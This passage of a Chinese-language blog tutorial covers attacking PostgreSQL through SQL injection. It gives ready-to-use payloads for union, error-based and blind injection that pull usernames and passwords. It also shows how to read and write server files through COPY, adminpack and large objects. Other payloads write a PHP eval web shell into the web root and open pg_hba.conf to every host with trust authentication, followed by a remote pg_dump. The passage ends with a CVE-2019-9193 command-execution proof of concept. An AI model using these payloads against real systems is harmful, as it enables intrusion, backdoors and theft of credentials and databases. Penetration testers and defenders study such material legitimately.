class="string">&#x27;public&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;Users&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 获取public.User表的数据</span><br><span class="line">index.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> concat_ws(<span class="string">&#x27;--&#x27;</span>,username,password) <span class="keyword">from</span> public.&quot;Users&quot; limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>),<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h3 id="Union-List注入"><a href="#Union-List注入" class="headerlink" title="Union-List注入"></a>Union-List注入</h3><p>顾名思义，Union-List 型注入点所在脚本文件会遍历查询返回的结果集中每一行，并在将其处理后输出到页面。</p>
<p>Union-Select与Union-List的区别在于前者只能查询一行，而后者可以查询多行。</p>
<p>例如：访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">List.php?type<span class="operator">=</span>article<span class="string">&#x27; union select  1111,&#x27;</span><span class="number">2222</span><span class="string">&#x27;,&#x27;</span><span class="number">3333</span><span class="string">&#x27;,&#x27;</span><span class="number">4444</span><span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
<p>会发现列表中多出了一条名为 3333 的项,同时其链接指向 1111,可以确认 1、3 为两个显示位。</p>
<p>此时访问：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">List.php?type<span class="operator">=</span>article<span class="string">&#x27; and 1=2 union select 1,&#x27;&#x27;,table_schema,&#x27;&#x27; from information_schema.tables where table_schema not in (&#x27;</span>pg_catalog<span class="string">&#x27;,&#x27;</span>information_schema<span class="string">&#x27;) --+</span></span><br></pre></td></tr></table></figure>
<p>即可列出所有的 Schema</p>
<p>具体payload构造参考Union-Select，不做详解。</p>
<h3 id="Union-Image注入"><a href="#Union-Image注入" class="headerlink" title="Union-Image注入"></a>Union-Image注入</h3><p>一种特殊的 Union-Select 型联合注入，这里暂时称之为 Union-Image 型注入。这种注入的主要不同点在于数据库中储存的字段不是常见的数值或字符串,而是 bytea 型数据(类似于 MSSQL 中image 类型)。bytea 可以看作是字节数组(byte-array),由于 postgres 允许将 <code>varchar/text</code> 类型转换为bytea,同时也可以自动从 Unknown 类型进行转换(执行这两种转换时,会将字符串代表的内容转换为对应的以数据库默认字符编码转换后的值,默认为 UTF8),所以实际在注入时并没有太明显的区别。</p>
<p>要注意的事项有两点：</p>
<ol>
<li><p>由于服务器脚本在处理返回字段时会将此字段表达的字节直接输出到 Response 流中(只有这样用户才能从浏览器中看到完整的图片)，所以某些需要判断关键字的注入工具在这里是不起作用的，只能通过手<br>工进行注入。</p>
</li>
<li><p>由于服务器可能会返回 <code>image/jpeg</code> 头，在浏览器中测试可能导致即使注入成功也只会返回一个错误图片的红叉，所以建议一旦确定是 Union-Image 型注入，建议转为使用 Burp 等工具进行操作。</p>
</li>
</ol>
<p>例如，访问：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Image.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;%e6%96%b0&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>则会返回字符“新”（%e6%96%b0 为 URL 编码后经过 UTF8 编码后的“新”</p>
<p>访问：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Image.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,table_schema::text::bytea <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>即可列出第一个 Schema 名称,逐渐修改 offset 的值即可获取所有的 Schema 名称。</p>
<h3 id="Union-Download注入"><a href="#Union-Download注入" class="headerlink" title="Union-Download注入"></a>Union-Download注入</h3><p>最后一种暂时称之为 Union-Download 型注入点，也就是服务器将上传的文件保存在某个目录下（例如为了安全起见，统一保存在网站目录上一级中的 uploads 目录中，即/../uploads,以防止上传攻击），同时在数据库中保存文件的路径。用户下载文件时服务器脚本根据传递的 id 获取文件路径，读取文件并直接输出到 Response 流。</p>
<p>这种 Union-Download 型注入点并不是非常常见，但一旦发现,则必然是一个危害性不亚于注入的任意文件下载漏洞。在非文件服务器与 web 服务器分离的情况下可能通过此注入点下载网站所有脚本并进一步攻击，危害可谓极大（在 linux 权限划分极为严格的情况下，postgres 用户是不可能访问网站目录的。而此漏洞却突破了这个限制，危害自然不言而喻）。</p>
<p>Download.php 模拟了此种注入的情形,访问：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Download.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;/download.php&#x27;</span>,<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>借助强制类型转换所导致的报错来获取信息。这就需要一个前提：服务器脚本可以返回一些数据库错误信息。</p>
<p>payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 获取当前数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> a::<span class="type">int</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">&#x27;~&#x27;</span><span class="operator">||</span>current_database() <span class="keyword">as</span> a)x <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 获取当前schema</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> a::<span class="type">int</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">&#x27;~&#x27;</span><span class="operator">||</span><span class="built_in">CURRENT_SCHEMA</span> <span class="keyword">as</span> a)x <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 获取schema为public的第<span class="number">1</span>张表名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> a::<span class="type">int</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">&#x27;~&#x27;</span><span class="operator">||</span>table_name <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>)x <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 获取public.Users的第<span class="number">1</span>个字段名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> a::<span class="type">int</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">&#x27;~&#x27;</span><span class="operator">||</span>column_name <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;Users&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>)x <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 获取public.User表的数据</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> a::<span class="type">int</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">&#x27;~&#x27;</span><span class="operator">||</span>concat_ws(<span class="string">&#x27;--&#x27;</span>,username,password) <span class="keyword">as</span> a <span class="keyword">from</span> public.&quot;Users&quot; limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>)x <span class="comment">--</span></span><br></pre></td></tr></table></figure>
<h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><p>当服务器脚本屏蔽了错误回显，同时不能使用 union 的情况下，可以采用盲注的手法获取数据。</p>
<p>这种盲注手法需要用到两个函数：<code>substr()</code> 和 <code>ascii()</code>。substr 用于从指定位置截取指定长度的字符串，ascii 用于将字符转换为 ascii 码。</p>
<p>获取到 ascii 码之后，将其与数字进行比较即可获取字符串的值，例如以下payload会在当前的Schema 名称的首字母为小写时返回 true：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(<span class="built_in">current_schema</span>(),<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">between</span> <span class="number">97</span> <span class="keyword">and</span> <span class="number">122</span></span><br></pre></td></tr></table></figure>
<p>通过构造不同语句，逐个获取字符并比较，即可取得任何的信息。</p>
<h2 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h2><p>基于时间的盲注，通过判断延时语句是否执行来获知条件是否为真或语句是否执行。</p>
<p>在 postgres 中,延时的语句为<code>pg_sleep(int)</code>。其中 int 表示要等待的秒数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> pg_sleep(<span class="number">5</span>) <span class="keyword">where</span> (<span class="keyword">select</span> ascii(substr(<span class="built_in">CURRENT_USER</span>,<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">90</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>通过构造不同语句，逐个获取字符并比较，即可取得任何的信息。</p>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><p>网上能够找到的资料中 postgres 注入读写文件大多都是使用 copy 操作符。copy 可以从将文件导入数据库，或是从数据库导出文件。</p>
<h4 id="copy-from-导入文件"><a href="#copy-from-导入文件" class="headerlink" title="copy from 导入文件"></a>copy from 导入文件</h4><p>可以配合堆叠注入，先新建一个表，再将文件内容导入到表中。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test_for_copy(data text);</span><br><span class="line"><span class="keyword">copy</span> test_for_copy(data) <span class="keyword">from</span> <span class="string">&#x27;c:/temp/file.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>之后使用 select 语句便可进行查询。</p>
<blockquote>
<p>看起来似乎很美好，但 copy from 有以下缺陷：</p>
<ol>
<li><p>分隔符</p>
<p>默认情况下 postgres 认为制表符(\t,0x09)为两个字段的分隔符，同时以换行符作为每一<br>行的分隔符。如果要导入的文件中含有制表符，那么制表符至下一个换行符之间的内容都被认为是另一个字段，如果目标表只有一个字段，则会出错。</p>
<p>这其实不是什么太大的问题，copy 提供 <code>delimiter</code> 选项用以制定分隔符，例如以下语句将分隔符指定为 0x7f(这个符号在绝大多数文本文件内不可能出现)：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">copy</span> test_for_copy(data) <span class="keyword">from</span> <span class="string">&#x27;c:/temp/files.txt&#x27;</span> <span class="keyword">with</span> delimiter E<span class="string">&#x27;\x7f&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p>遇到<code>\.</code>时会终止并报错</p>
<p>如果一个文件中包含<code>\.</code>，那么使用 copy from 语句导入时会返回“copy<br>命令结束标记损坏”的错误(原因是<code>\.</code>是 copy from stdin 模式下的结束标识,具体参考本节最后的官方文档)。<br>一个典型就是 apache 的配置文件。大大多数情况下 apache 配置文件中都有以下语句：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;^\<span class="attr">.ht</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>由于出现了<code>\.</code>，所以语句将出错,导致无法导入。而在找不到网站路径时读取配置文件是相当重要且行之有效的方法，出现这种情况非常令人恼火。</p>
</li>
</ol>
<ol>
<li><p>导入文件编码必须与服务器编码相对应</p>
<p>Copy from 只能导入与服务器编码相同的文本文件（一般为默认值 UTF8），如果导入文件中以服务器编码加载时出现无效字符，则会返回“无效的 XXXX 编码字节顺序”的错误，其中 XXXX 为编码名称，如 UTF8。例如,在一个文本文件中写入文本“测试”了，并以 ANSI 编码保存（这样在简体中文操作系统中文件实际的编码为 GB2312），执行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">copy</span> test_for_copy(data) <span class="keyword">from</span> <span class="string">&#x27;c:/temp/files.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>会返回以下错误信息：<code>无效的 &quot;UTF8&quot; 编码字节顺序: 0xb2</code></p>
<p>同样的,既然无法导入不同编码的文件,那么导入二进制文件更加是不可能的。如果通过某些漏洞（例如编辑器带来的目录遍历）获取到服务器重要备份文件路径（非 web 目录下），结果却无法将其下载下来,这无疑会让人十分恼火。</p>
</li>
</ol>
</blockquote>
<h4 id="copy-to-导出文件"><a href="#copy-to-导出文件" class="headerlink" title="copy to 导出文件"></a>copy to 导出文件</h4><p>copy to 可以将一个表中的字段或一个查询的结果导出到文件中，用于脱裤是很方便的。</p>
<p>例如，以下语句会将 files 表的内容全部备份到 <code>c:/temp/files.txt</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">copy</span> files <span class="keyword">to</span> <span class="string">&#x27;c:/temp/files.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>以下语句会将 php 一句话<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>写入 <code>C:\Wamp\apache2.4\htdocs\WWW\a.php</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">copy</span> (<span class="keyword">select</span> $$<span class="operator">&lt;</span>?php <span class="variable">@eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);?<span class="operator">&gt;</span>$$) <span class="keyword">to</span> <span class="string">&#x27;C:\Wamp\apache2.4\htdocs\WWW\a.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>但是 copy to 也有一个缺点：任何不能转换为字符串的字节都将被转换为八进制形式。</p>
<h3 id="AdminPack"><a href="#AdminPack" class="headerlink" title="AdminPack"></a>AdminPack</h3><p>Adminpack 是 postgres 在 8.2 新加入的一个拓展，这个拓展可以包含一系列函数，可以在允许的范围内进行文件操作。</p>
<p>这些函数大多数并没有添加，需要手动进行添加。已经添加的函数列表如下，adminpack 会将其指定为另一个别名（原始名称仍可用）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">pg_read_file(text, <span class="type">bigint</span>, <span class="type">bigint</span>)</span><br><span class="line">pg_stat_file(text)</span><br><span class="line">pg_rotate_logfile()</span><br></pre></td></tr></table></figure>
<p>其余函数的添加语句见 postgres 安装目录下：</p>
<p><code>/share/extension/adminpack-1.0.sql</code>（windows）</p>
<p>或 postgres 源码目录下：</p>
<p><code>/contrib/adminpack/adminpack--1.0.sql</code>（linux，仅源码安装方式）</p>
<p>注意：在 linux 下需手动编译 <code>adminpack.c</code>，命令为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc $PGSRC/contrib/adminpack/adminpack.c -shared -fPIC -/usr/local/pgsql/include/server -o adminpack.so</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 其中<span class="variable">$PGSRC</span> 为 postgres 源码路径</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：由于 <code>pg_ls_dir(text)</code>、<code>pg_read_binary_file(text, bigint, bigint)</code>两个函数与 adminpack 函数极为相似，所以在此也归为 adminpack 函数中。</p>
</blockquote>
<p><strong>adminpack的局限性</strong>：</p>
<p>adminpack 可以进行在允许的范围内文件操作，但范围只限于数据目录中。也就是说,在数据目录外的文件不可能通过 adminpack 函数进行操作。</p>
<p>Adminpack 函数的源代码见：</p>
<ul>
<li><a href="http://doxygen.postgresql.org/adminpack_8c_source.html">http://doxygen.postgresql.org/adminpack_8c_source.html</a>  (sql 文件中前五个函数)</li>
<li><a href="http://doxygen.postgresql.org/genfile_8c_source.html">http://doxygen.postgresql.org/genfile_8c_source.html</a>  (其余的 adminpack 函数)</li>
</ul>
<p>可以看到,这些进行文件操作的函数都经过 <code>convert_and_check_filename</code> 函数进行检测。如果使用绝对路径查询,会返回“不允许使用绝对路径”的错误；如果路径中使用了..跳转到上级目录，则返回“路径必须在当前目录或子目录下”的错误。</p>
<p>这样，adminpack 只能读取数据目录的文件或向其中写入文件，限制目录的文件读取作用有限，同时由于 <code>pg_file_write</code> 的函数签名为 <code>pg_file_write(text,text,boolean)</code>，其中第一个参数为路径，第二个参数为要写入的内容，第三个参数为是否追加，导致写入二进制文件是不可能的(postgres 不允许 0 字符)。</p>
<p>当然，adminpack 也不是完全没有用处，由于 postgres 对于登陆的授权文件 <code>pg_hba.conf</code> 也处于 data目录，刚好可以由 adminpack 函数编辑。所以当可以使用 adminpack 函数时，可以尝试以下操作：</p>
<h4 id="写入pg-hba-conf文件"><a href="#写入pg-hba-conf文件" class="headerlink" title="写入pg_hba.conf文件"></a>写入pg_hba.conf文件</h4><p>执行查询语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> inet_server_addr();</span><br></pre></td></tr></table></figure>
<p>将返回数据库的 IP 地址(相对于本次连接)，如果为 127.0.0.1，则说明与 web 服务器为相同 ip。</p>
<p>之后执行查询语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> pg_file_write(<span class="string">&#x27;pg_hba.conf&#x27;</span>,chr(<span class="number">10</span>)<span class="operator">||</span><span class="string">&#x27;host all all 0.0.0.0/0 trust&#x27;</span><span class="operator">||</span>chr(<span class="number">10</span>),<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>这将在 <code>pg_hba.conf</code> 末尾添加一条授权，表示允许来自任何 ip 的任何用户使用任何用户（包括 postgres）连接任何数据库，同时信任本次连接，不要求任何授权验证（除非有其余语句显式限制了某个 IP 段）。</p>
<h4 id="读取pg-hba-conf文件"><a href="#读取pg-hba-conf文件" class="headerlink" title="读取pg_hba.conf文件"></a>读取pg_hba.conf文件</h4><p>执行查询语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">&#x27;pg_hba.conf&#x27;</span>)::<span class="type">int</span>;</span><br></pre></td></tr></table></figure>
<p>读取 <code>pg_hba.conf</code> 并分析，必要时将 <code>pg_file_write</code> 函数的第三个参数设为 <code>false</code>，从而达到覆盖配置文件的效果。</p>
<p>然后等待数据库服务器重启（windows 下面配置文件一经修改会自动重新加载，可以直接进行连接），最后即可使用 psql 工具远程连接数据库执行查询，或是用 pgadmin/pg_dump 脱裤。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 连接远程数据库 192.168.123.188，并将 <span class="built_in">test</span> 数据库备份到本地 back.backup 文件中</span></span><br><span class="line">pg_dump.exe -w --host 192.168.123.188 --username &quot;postgres&quot; --compress 9 --no-password --blobs --section pre-data --section data --section post-data --encoding UTF8 --inserts --column-inserts --verbose --file back.backup &quot;test&quot;</span><br></pre></td></tr></table></figure>
<h3 id="Large-Object"><a href="#Large-Object" class="headerlink" title="Large Object"></a>Large Object</h3><p>Large Object 可以近似的看作储存于数据库中的逻辑文件，在使用时可以完全的将其作为文件进行操作。</p>
<blockquote>
<p>注：操作 Large Object 要求 super 权限。</p>
</blockquote>
<h4 id="创建大对象"><a href="#创建大对象" class="headerlink" title="创建大对象"></a>创建大对象</h4><p>创建大对象有两种方法：新建或导入。</p>
<p>使用 <code>lo_creat</code> 函数即可创建一个空的大对象，并由系统自动分配 oid，例如执行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_creat(<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>
<p>会返回一个 oid，例如 73954。</p>
<p>也可以使用 <code>lo_create</code> 函数创建空的大对象，并将大对象与指定的 oid 相关联。例如执行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_create(<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>
<p>会返回 4294967295，表示成功创建 oid 为 4294967295 的大对象。</p>
<p>或者可以使用 <code>lo_import</code> 将某个已存在的文件导入为大对象，并由系统自动分配 oid，例如执行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_import(<span class="string">&#x27;c:/windows/system32/cmd.exe&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>会返回一个 oid，例如 73955，同时大对象中的数据即为完整的 cmd.exe。</p>
<p>也可以手动指定大对象的 oid，注意这个 oid 不可与其他大对象的 oid 相重复，例如执行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> lo_import(<span class="string">&#x27;c:/windows/system32/cmd.exe&#x27;</span>,<span class="number">12345678</span>);</span><br></pre></td></tr></table></figure>
<p>会返回 12345678，表示成功创建 oid 为 12345678 的大对象并将 cmd.exe 导入其中。</p>
<h4 id="打开大对象"><a href="#打开大对象" class="headerlink" title="打开大对象"></a>打开大对象</h4><p>创建完大对象后便可以使用 <code>lo_open</code> 打开这个大对象，<code>lo_open</code> 的函数签名为 <code>lo_open(oid, int)</code>，第一个参数为大对象的 oid，第二个参数为读写模式，是一个常量。</p>
<p>这个函数在官方函数文档中没有任何说明，在 API 文档中的说明为“打开一个大对象返回其操作描述符”，但实际上在查询语句中使用时不论如何都会返回 0。</p>
<p>而读写模式也没有任何说明，对照 API 文档并结合源码最终发现这个模式在文件：<code>include/libpq/libpq-fs.h</code>中提供了定义：</p>
<p><img src="https://i.loli.net/2021/10/11/py9cSIR7TmCftoA.png" alt="image-20211011141407201"></p>
<p>这个模式可以进行位操作，指定其为 INV_READ|INV_WRITE (0x00060000)即代表可以同时进行读写操作。</p>
<p>综上,可以使用以下语句打开一个大对象,并指定操作为写入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(<span class="number">73954</span>,x<span class="string">&#x27;20000&#x27;</span>::<span class="type">int</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：打开一个大对象之后，大对象的数据指针会指向其最开始的那个字节。</p>
</blockquote>
<h4 id="写入大对象"><a href="#写入大对象" class="headerlink" title="写入大对象"></a>写入大对象</h4><p>写入大对象需要使用函数 <code>lowrite</code>( 注意这里没有下划线 ) , <code>lowrite</code> 的函数签名为<code>lowrite(int,bytea)</code>，第一个参数为由 <code>lo_open</code> 函数打开所返回的句柄，第二个参数为要写入的内容（从这里就能看出，可以向大对象中写入任何内容）。同样的，这个函数在官方函数文档也没有任何说明。</p>
<p>例如以下语句会将 0xfeffbf 写入 oid 为 73954 的大对象中：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(<span class="number">73954</span>,x<span class="string">&#x27;20000&#x27;</span>::<span class="type">int</span>);</span><br><span class="line"><span class="keyword">select</span> lowrite(<span class="number">0</span>,decode(<span class="string">&#x27;feffbf&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>注意：这里使用 decode 函数将 hex 值转换为字节数组，直接使用 unknown 类型是不正确的。</p>
<p>有时候可能需要分多次将数据导入同一个大对象中，这就要求每一次进行写操作前大对象的数据指针都指向末尾，使用 <code>lo_lseek</code> 函数即可完成这一点。</p>
<p><code>lo_lseek</code> 的函数签名为 <code>lo_lseek(int,int,int)</code>，第一个参数为由 <code>lo_open</code> 函数打开所返回的句柄，第二个参数为相对位置，第三个参数为相对位置的起始点，是一个常量。</p>
<p>和 <code>lo_open</code> 类似,这个在官方函数文档没有任何说明，通过对比 API 文档并查看源码最终在文件：<code>include/zconf.h</code>中发现以下定义：</p>
<p><img src="https://i.loli.net/2021/10/11/hwY5NrIgKObSnxM.png" alt="image-20211011192152967"></p>
<p>综上,可以使用以下语句打开 oid 为 73954 的大对象，并将其数据指针指向末尾：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(<span class="number">73954</span>,x<span class="string">&#x27;60000&#x27;</span>::<span class="type">int</span>);</span><br><span class="line"><span class="keyword">select</span> lo_lseek(<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>之后便可以使用 <code>lowrite</code> 函数直接向这个大对象中写入内容。</p>
<h4 id="导出大对象"><a href="#导出大对象" class="headerlink" title="导出大对象"></a>导出大对象</h4><p>当完成对一个大对象的导入/写入操作后，接下来需要做的就是获取其内容（针对导入，即读取文件）</p>
<p>将大对象导出可以使用 <code>lo_export</code> 函数，这个函数的签名为<code>lo_export(oid,text)</code>，第一个参数为要导出的大对象的 oid，第二个参数为导出的路径，如果导出路径为相对路径，则会导入至当前的数据目录中。</p>
<p>例如，执行以下语句会将 oid 为 73954 的大对象导出至 <code>c:/windows/temp/123.txt</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_export(<span class="number">73954</span>,<span class="string">&#x27;c:/windows/temp/1.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>Postgres 会将所有的大对象数据保存于 <code>pg_catalog</code> 目录下的 <code>pg_largeobject</code> 目录对象中，这个目录对象有三个字段，loid、pageno、data。</p>
<ul>
<li>loid 代表大对象的 oid，与 <code>lo_create</code> 等函数的返回值相同。</li>
<li>pageno 为分页序号，大对象的数据会被分为多个页进行储存,这个字段就是每个页之间的序号。</li>
<li>Data 为储存在这一页中的部分大对象数据，为 bytea 类型。</li>
</ul>
<p>于是在知道 oid 的时候，可以使用以下语句获取一个大对象中所有的数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">array_agg</span>(b)::text::<span class="type">int</span> <span class="keyword">from</span>(<span class="keyword">select</span> encode(data,<span class="string">&#x27;hex&#x27;</span>)b,pageno <span class="keyword">from</span> pg_largeobject <span class="keyword">where</span> loid<span class="operator">=</span><span class="number">73957</span> <span class="keyword">order</span> <span class="keyword">by</span> pageno)a<span class="comment">--</span></span><br></pre></td></tr></table></figure>
<p>从返回的错误信息中去掉花括号、逗号，仅保留 HEX 字符，之后将所有的 HEX 字符粘贴到 winhex 中即可完整的还原这个大对象。</p>
<h4 id="关闭大对象"><a href="#关闭大对象" class="headerlink" title="关闭大对象"></a>关闭大对象</h4><p>当需要关闭一个大对象时,可以使用 <code>lo_close</code> 函数，这个函数的签名为 <code>lo_close(int)</code>，参数为由<code>lo_open</code> 函数打开所返回的句柄。</p>
<p>例如，使用以下语句即可关闭已经打开的大对象：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(<span class="number">73954</span>,x<span class="string">&#x27;60000&#x27;</span>::<span class="type">int</span>);</span><br><span class="line"><span class="keyword">select</span> lo_close(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<h4 id="删除大对象"><a href="#删除大对象" class="headerlink" title="删除大对象"></a>删除大对象</h4><p>最后，如果需要删除一个大对象，需要使用 <code>lo_unlink</code> 函数，例如执行以下语句会将 oid 为 73954 的大对象永久删除。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> lo_unlink(<span class="number">73954</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>另：一个小技巧。在 linux 系统下如果 lo_import 等函数的第一个参数指向的路径是一个目录,则会返回以下错误：</p>
<p><code>ERROR: could not read server file &quot;/&quot;: 是一个目录</code></p>
<p>而在 windows 下会返回：</p>
<p><code>错误: 无法打开服务器文件 &quot;c:/windows/temp&quot;: Permission denied</code></p>
<p>这个错误提示在注入中可以用来猜测目录，在有时会有意想不到的收获。</p>
</blockquote>
<h3 id="高权限命令执行漏洞-CVE-2019-9193"><a href="#高权限命令执行漏洞-CVE-2019-9193" class="headerlink" title="高权限命令执行漏洞 [CVE-2019-9193 ]"></a>高权限命令执行漏洞 [CVE-2019-9193 ]</h3><p><strong>受影响版本</strong></p>
<ul>
<li>PostgreSQL 9.3至11.2</li>
</ul>
<p>其9.3到11版本中存在一处“特性”，管理员或具有<code>COPY TO/FROM PROGRAM</code>权限的用户，可以使用这个特性执行命令。</p>
<p>POC：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> cmd_exec;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> cmd_exec(cmd_output text);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">COPY</span> cmd_exec <span class="keyword">FROM</span> PROGRAM <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> cmd_exec;</span><br></pre></td></tr></table></figure>
